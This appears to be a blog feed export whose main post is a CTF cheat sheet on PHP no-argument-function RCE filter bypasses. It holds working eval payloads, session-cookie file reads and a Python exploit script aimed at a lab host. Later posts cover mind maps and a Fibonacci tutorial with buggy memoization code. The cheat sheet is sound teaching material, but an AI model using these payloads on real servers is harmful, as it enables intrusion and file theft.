<p><strong>利用条件</strong>：<code>eval($_GET[&#39;exp&#39;]);</code></p>
<p><strong>限制条件</strong>：<code>preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $exp)</code></p>
<span id="more"></span>

<p><strong>目录下文件</strong>：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429110200063.png" alt loading="lazy"></p>
<h4 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a><strong>测试代码</strong></h4><pre class="language-php" data-language="php"><code class="language-php">//index.php
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    
    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p><code>(?R)</code>引用当前表达式，后面加了<code>?</code>递归调用</p>
<p>以上正则表达式只匹配<code>a(b(c()))</code>或<code>a()</code>这种格式，不匹配<code>a(&quot;123&quot;)</code>，也就是说我们传入的值函数不能带有参数</p>
<h4 id="Payload1-getenv"><a href="#Payload1-getenv" class="headerlink" title="Payload1-getenv()"></a>Payload1-getenv()</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>可以获取敏感信息</p>
<ul>
<li><strong>getenv()</strong>：获取一个环境变量的值，<code>phpinfo()</code>可以获取所有环境变量</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429113257924.png" alt loading="lazy"></p>
<h4 id="Payload2-getallheaders"><a href="#Payload2-getallheaders" class="headerlink" title="Payload2-getallheaders()"></a><strong>Payload2</strong>-getallheaders()</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token function">getallheaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>RCE</p>
<ul>
<li><strong>end()</strong>：将数组的内部指针指向最后一个单元</li>
<li><strong>getallheaders()</strong>：获取全部 HTTP 请求头信息</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429114144142.png" alt loading="lazy"></p>
<h4 id="Payload3-get-defined-vars"><a href="#Payload3-get-defined-vars" class="headerlink" title="Payload3-get_defined_vars()"></a>Payload3-get_defined_vars()</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token function">current</span><span class="token punctuation">(</span><span class="token function">get_defined_vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>flag<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>利用全局变量进RCE</p>
<ul>
<li><strong>get_defined_vars()</strong>：返回由所有已定义变量所组成的数组，会返回<code>$_GET,$_POST,$_COOKIE,$_FILES</code>全局变量的值</li>
<li><strong>current()</strong>：返回数组中的当前单元，初始指向插入到数组中的第一个单元，也就是会返回<code>$_GET</code>变量的数组值</li>
<li><strong>get_defined_vars()</strong>：返回由所有已定义变量所组成的数组，此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。返回数组顺序为<code>get-&gt;post-&gt;cookie-&gt;files</code></li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429115651090.png" alt loading="lazy"></p>
<p>而如果网站对<code>$_GET,$_POST,$_COOKIE</code>都做的过滤， 那我们只能从<code>$_FILES</code>入手了，exp如下：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">def</span> <span class="token function">str2hex</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
  txt <span class="token operator">=</span> <span class="token string">''</span>
  <span class="token keyword">for</span> i <span class="token keyword">in</span> payload<span class="token punctuation">:</span>
      txt <span class="token operator">+=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
  <span class="token keyword">return</span> txt
payload <span class="token operator">=</span> str2hex<span class="token punctuation">(</span><span class="token string">"system('cat flag.php');"</span><span class="token punctuation">)</span>
files <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    payload<span class="token punctuation">:</span> <span class="token string">b'extrader'</span>
<span class="token punctuation">&#125;</span>
r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://192.168.0.107/index.php?exp=eval(hex2bin(array_rand(end(get_defined_vars()))));"</span><span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>  <span class="token comment"># allow_redirects=False 禁用重定向处理</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<ul>
<li><strong>array_rand()</strong>：从数组中随机取出一个或多个单元，如果只取出一个，<code>array_rand()</code>返回随机单元的键名。 否则就返回包含随机键名的数组。</li>
<li><strong>end()</strong>：将数组的内部指针指向最后一个单元</li>
<li><strong>hex2bin()</strong>：转换十六进制字符串为二进制字符串</li>
</ul>
<p>结果将输出<code>flag.php</code>文件的全部内容，由于空格和点都会被替换成下换线，所以需要用十六进制进行绕过</p>
<h4 id="Payload4-session-start"><a href="#Payload4-session-start" class="headerlink" title="Payload4-session_start()"></a>Payload4-session_start()</h4><p>文件读取：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">readfile</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
抓包传入Cookie<span class="token punctuation">:</span> <span class="token constant">PHPSESSID</span><span class="token operator">=</span><span class="token punctuation">(</span>想读的文件<span class="token punctuation">)</span>即可</code></pre>

<p>RCE：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
抓包传入Cookie<span class="token punctuation">:</span> <span class="token constant">PHPSESSID</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"system('命令')"</span>的十六进制<span class="token punctuation">)</span></code></pre>

<p>以上的payload好像只适用于<code>php7</code>以下的版本，php7以上的不会显示</p>
<ul>
<li><strong>session_start()</strong>：启动新会话或者重用现有会话，成功开始会话返回 <strong><code>TRUE</code></strong> ，反之返回 <strong><code>FALSE</code></strong></li>
<li><strong>session_id()</strong>：获取/设置当前会话 ID，返回当前会话ID。 如果当前没有会话，则返回空字符串（””）。</li>
</ul>
<h4 id="Payload5-scandir"><a href="#Payload5-scandir" class="headerlink" title="Payload5-scandir()"></a>Payload5-scandir()</h4><p>文件读取：</p>
<pre class="language-php" data-language="php"><code class="language-php">当前目录：<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">array_rand</span><span class="token punctuation">(</span><span class="token function">array_flip</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
上级目录文件：<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">array_rand</span><span class="token punctuation">(</span><span class="token function">array_flip</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<ul>
<li><strong>getcwd()</strong>：取得当前工作目录，成功则返回当前工作目录，失败返回 <strong><code>FALSE</code></strong>。</li>
<li><strong>dirname()</strong>：返回路径中的目录部分，返回 path 的父目录。 如果在 <code>path</code> 中没有斜线，则返回一个点（’<em>.</em>‘），表示当前目录。否则返回的是把 <code>path</code> 中结尾的 <code>/component</code>（最后一个斜线以及后面部分）去掉之后的字符串(也就是上级目录的文件路径)。</li>
<li><strong>chdir()</strong>：改变目录，成功时返回 <strong><code>TRUE</code></strong>， 或者在失败时返回 <strong><code>FALSE</code></strong>。</li>
<li><strong>scandir()</strong>：列出指定路径中的文件和目录。成功则返回包含有文件名的数组，如果失败则返回 <strong><code>FALSE</code></strong>。如果 <code>directory</code> 不是个目录，则返回布尔值 <strong><code>FALSE</code></strong> 并生成一条 <strong><code>E_WARNING</code></strong> 级的错误。</li>
<li><strong>array_flip()</strong>：交换数组中的键和值，成功时返回交换后的数组，如果失败返回 <strong><code>NULL</code></strong>。</li>
<li><strong>array_rand()</strong>：从数组中随机取出一个或多个单元，如果只取出一个(默认为1)，<strong>array_rand()</strong> 返回随机单元的键名。 否则就返回包含随机键名的数组。 完成后，就可以根据随机的键获取数组的随机值。</li>
</ul>
<p><strong>array_flip()</strong>和<strong>array_rand()</strong>配合使用可随机返回当前目录下的文件名</p>
<p><strong>dirname(chdir(dirname()))</strong>配合切换文件路径</p>
<h4 id="绕过"><a href="#绕过" class="headerlink" title=".绕过"></a><code>.</code>绕过</h4><h5 id="current-localeconv"><a href="#current-localeconv" class="headerlink" title="current(localeconv())"></a><strong>current(localeconv())</strong></h5><ul>
<li><strong>localeconv()</strong>：返回一包含本地数字及货币格式信息的数组。而数组第一项就是<code>.</code></li>
</ul>
<h5 id="phpversion"><a href="#phpversion" class="headerlink" title="phpversion()"></a><strong>phpversion()</strong></h5><ul>
<li><code>phpversion()</code>返回php版本，如<code>7.3.5</code></li>
<li><code>floor(phpversion())</code>返回<code>7</code></li>
<li><code>sqrt(floor(phpversion()))</code>返回<code>2.6457513110646</code></li>
<li><code>tan(floor(sqrt(floor(phpversion()))))</code>返回<code>-2.1850398632615</code></li>
<li><code>cosh(tan(floor(sqrt(floor(phpversion())))))</code>返回<code>4.5017381103491</code></li>
<li><code>sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))</code>返回<code>45.081318677156</code></li>
<li><code>ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))</code>返回<code>46</code></li>
<li><code>chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))</code>返回<code>.</code></li>
<li><code>var_dump(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))</code>扫描当前目录</li>
<li><code>next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))</code>返回<code>..</code></li>
</ul>
<p><strong>floor()</strong>：舍去法取整，<strong>sqrt()</strong>：平方根，<strong>tan()</strong>：正切值，<strong>cosh()</strong>：双曲余弦，<strong>sinh()</strong>：双曲正弦，<strong>ceil()</strong>：进一法取整</p>
<h5 id="crypt"><a href="#crypt" class="headerlink" title="crypt()"></a><strong>crypt()</strong></h5><p><code>chr(ord(hebrevc(crypt(phpversion()))))</code>返回<code>.</code></p>
<ul>
<li><code>hebrevc(crypt(arg))</code>可以随机生成一个hash值 第一个字符随机是 $(大概率) 或者 .(小概率) 然后通过ord chr只取第一个字符</li>
</ul>
<p><strong>crypt()</strong>：单向字符串散列，返回散列后的字符串或一个少于 13 字符的字符串，从而保证在失败时与盐值区分开来。</p>
<p><strong>hebrevc()</strong>：将逻辑顺序希伯来文（logical-Hebrew）转换为视觉顺序希伯来文（visual-Hebrew），并且转换换行符，返回视觉顺序字符串。</p>
<h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><p><strong>current()</strong>的别名<strong>pos()</strong></p>
<p><strong>readgzfile</strong>可以代替<strong>readfile</strong></p>
<p>目录操作：</p>
<ul>
<li><strong>getchwd()</strong> ：函数返回当前工作目录。</li>
<li><strong>scandir()</strong> ：函数返回指定目录中的文件和目录的数组。</li>
<li><strong>dirname()</strong> ：函数返回路径中的目录部分。</li>
<li><strong>chdir()</strong> ：函数改变当前的目录。</li>
</ul>
<p>数组相关的操作：</p>
<ul>
<li><a href="https://www.w3school.com.cn/php/func_array_end.asp">end()</a> ： 将内部指针指向数组中的最后一个元素，并输出</li>
<li><a href="https://www.w3school.com.cn/php/func_array_next.asp">next()</a> ：将内部指针指向数组中的下一个元素，并输出</li>
<li><a href="https://www.w3school.com.cn/php/func_array_prev.asp">prev()</a> ：将内部指针指向数组中的上一个元素，并输出</li>
<li><a href="https://www.w3school.com.cn/php/func_array_reset.asp">reset()</a> ： 将内部指针指向数组中的第一个元素，并输出</li>
<li><a href="https://www.w3school.com.cn/php/func_array_each.asp">each()</a> ： 返回当前元素的键名和键值，并将内部指针向前移动</li>
</ul>
<h4 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h4><h5 id="GXYCTF2019—禁止套娃"><a href="#GXYCTF2019—禁止套娃" class="headerlink" title="GXYCTF2019—禁止套娃"></a>GXYCTF2019—禁止套娃</h5><p>扫描目录<code>.git</code>源码泄露，<code>Githack</code>得到<code>index</code>源码</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"flag在哪里呢？&lt;br>"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z,_]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token comment">// echo $_GET['exp'];</span>
                @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"还差一点哦！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"再好好想想！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"还想读flag，臭弟弟！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// highlight_file(__FILE__);</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>payload1：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token function">array_reverse</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">current</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>payload2：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Cookie<span class="token punctuation">:</span> <span class="token constant">PHPSESSID</span><span class="token operator">=</span>flag<span class="token operator">.</span>php</code></pre>

<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul>
<li><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></li>
<li><a href="https://www.cnblogs.com/wangtanzhi/p/12260986.html">https://www.cnblogs.com/wangtanzhi/p/12260986.html</a></li>
<li><a href="http://www.manongjc.com/detail/13-ksgbihhdbvdbnza.html">http://www.manongjc.com/detail/13-ksgbihhdbvdbnza.html</a></li>
<li><a href="https://www.gem-love.com/ctf/530.html?replytocom=5">https://www.gem-love.com/ctf/530.html?replytocom=5</a></li>
</ul>
]]></content>
      <categories>
        <category>备忘录</category>
      </categories>
      <tags>
        <tag>CTF题</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>思维导图收集</title>
    <url>/posts/6f37048/</url>
    <content><![CDATA[<h3 id="GIT命令"><a href="#GIT命令" class="headerlink" title="GIT命令"></a>GIT命令</h3><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/思维导图收集/git命令.jpg" alt="git命令" style="zoom: 25%;" loading="lazy">

<h3 id="网络安全绪论"><a href="#网络安全绪论" class="headerlink" title="网络安全绪论"></a>网络安全绪论</h3><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/思维导图收集/网络安全绪论.jpg" alt="网络安全绪论" style="zoom:25%;" loading="lazy">

<h3 id="网络安全发展与未来"><a href="#网络安全发展与未来" class="headerlink" title="网络安全发展与未来"></a>网络安全发展与未来</h3><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/思维导图收集/网络安全发展与未来.jpg" alt="网络安全发展与未来" style="zoom:25%;" loading="lazy">

<h3 id="Web攻击及防御技术"><a href="#Web攻击及防御技术" class="headerlink" title="Web攻击及防御技术"></a>Web攻击及防御技术</h3><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/思维导图收集/Web攻击及防御技术.jpg" alt="Web攻击及防御技术" style="zoom:25%;" loading="lazy">

<h3 id="网络监听及防御技术"><a href="#网络监听及防御技术" class="headerlink" title="网络监听及防御技术"></a>网络监听及防御技术</h3><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/思维导图收集/网络监听及防御技术.jpg" alt="网络监听及防御技术" style="zoom:25%;" loading="lazy">

<h3 id="扫描与防御技术"><a href="#扫描与防御技术" class="headerlink" title="扫描与防御技术"></a>扫描与防御技术</h3><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/思维导图收集/扫描与防御技术.jpg" alt="扫描与防御技术" style="zoom:25%;" loading="lazy">

<h3 id="欺骗攻击及防御技术"><a href="#欺骗攻击及防御技术" class="headerlink" title="欺骗攻击及防御技术"></a>欺骗攻击及防御技术</h3><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/思维导图收集/欺骗攻击及防御技术.jpg" alt="欺骗攻击及防御技术" style="zoom:25%;" loading="lazy">

<h3 id="木马攻击及防御技术"><a href="#木马攻击及防御技术" class="headerlink" title="木马攻击及防御技术"></a>木马攻击及防御技术</h3><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/思维导图收集/木马攻击及防御技术.jpg" alt="木马攻击及防御技术" style="zoom:25%;" loading="lazy">

<h3 id="口令破解与防御技术"><a href="#口令破解与防御技术" class="headerlink" title="口令破解与防御技术"></a>口令破解与防御技术</h3><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/思维导图收集/口令破解与防御技术.jpg" alt="口令破解与防御技术" style="zoom:25%;" loading="lazy">

<h3 id="拒绝服务供给与防御技术"><a href="#拒绝服务供给与防御技术" class="headerlink" title="拒绝服务供给与防御技术"></a>拒绝服务供给与防御技术</h3><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/思维导图收集/拒绝服务供给与防御技术.png" alt="拒绝服务供给与防御技术" style="zoom:25%;" loading="lazy">

<h3 id="缓冲区溢出攻击及防御技术"><a href="#缓冲区溢出攻击及防御技术" class="headerlink" title="缓冲区溢出攻击及防御技术"></a>缓冲区溢出攻击及防御技术</h3><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/思维导图收集/缓冲区溢出攻击及防御技术.jpg" alt="缓冲区溢出攻击及防御技术" style="zoom:25%;" loading="lazy">

<h3 id="计算机病毒"><a href="#计算机病毒" class="headerlink" title="计算机病毒"></a>计算机病毒</h3><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/思维导图收集/计算机病毒.jpg" alt="计算机病毒" style="zoom:25%;" loading="lazy">

<h3 id="网络攻击链手段防护产品"><a href="#网络攻击链手段防护产品" class="headerlink" title="网络攻击链手段防护产品"></a>网络攻击链手段防护产品</h3><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/思维导图收集/网络攻击链手段防护产品.png" alt="网络攻击链手段防护产品" style="zoom:10%;" loading="lazy">

<h3 id="nginx源码分析全景图"><a href="#nginx源码分析全景图" class="headerlink" title="nginx源码分析全景图"></a>nginx源码分析全景图</h3><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/思维导图收集/nginx源码分析全景图.png" alt="nginx源码分析全景图" style="zoom:6%;" loading="lazy">

<p>另外在P神的github上也有些：<a href="https://github.com/phith0n/Mind-Map">https://github.com/phith0n/Mind-Map</a></p>
<ul>
<li>图片均来自网络，侵删</li>
</ul>
]]></content>
      <categories>
        <category>备忘录</category>
      </categories>
      <tags>
        <tag>思维导图</tag>
      </tags>
  </entry>
  <entry>
    <title>算法-动态规划</title>
    <url>/posts/e57c001c/</url>
    <content><![CDATA[<h3 id="斐波拉契数列"><a href="#斐波拉契数列" class="headerlink" title="斐波拉契数列"></a>斐波拉契数列</h3><p><code>1,1,2,3,5,8,13...</code>，状态转移方程：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421190059738.png" alt loading="lazy"></p>
<span id="more"></span>

<h4 id="暴力递归"><a href="#暴力递归" class="headerlink" title="暴力递归"></a><strong>暴力递归</strong></h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token number">1</span> <span class="token keyword">or</span> a <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">1</span>
    <span class="token keyword">return</span> main<span class="token punctuation">(</span>a<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> main<span class="token punctuation">(</span>a<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span></code></pre>

<p>时间复杂度为<code>O(2^n)</code>，有如下递归树：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421190828749.png" alt loading="lazy"></p>
<p>我们可以看到许多的计算都重复了，例如下面的<code>f(18)</code>等，那么如何避免这个问题呢？有效的方法就是将第一次计算出的<code>f(18)</code>的结果保留下来，如果下次再计算到这个<code>f(18)</code>的时候直接将结果取出来即可，简称备忘录方法，如下：</p>
<h4 id="带备忘录的递归解法"><a href="#带备忘录的递归解法" class="headerlink" title="带备忘录的递归解法"></a><strong>带备忘录的递归解法</strong></h4><pre class="language-python" data-language="python"><code class="language-python">memo <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token number">1</span> <span class="token keyword">or</span> a <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">1</span>
    <span class="token keyword">if</span> a <span class="token keyword">in</span> memo<span class="token punctuation">:</span>
        <span class="token keyword">return</span> memo<span class="token punctuation">[</span>a<span class="token punctuation">]</span>
    memo<span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">=</span> main<span class="token punctuation">(</span>a<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> main<span class="token punctuation">(</span>a<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> main<span class="token punctuation">(</span>a<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> main<span class="token punctuation">(</span>a<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span></code></pre>

<h4 id="DP-table解法"><a href="#DP-table解法" class="headerlink" title="DP table解法"></a><strong>DP table解法</strong></h4><p>自底向上优化</p>
<pre class="language-python" data-language="python"><code class="language-python">dp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
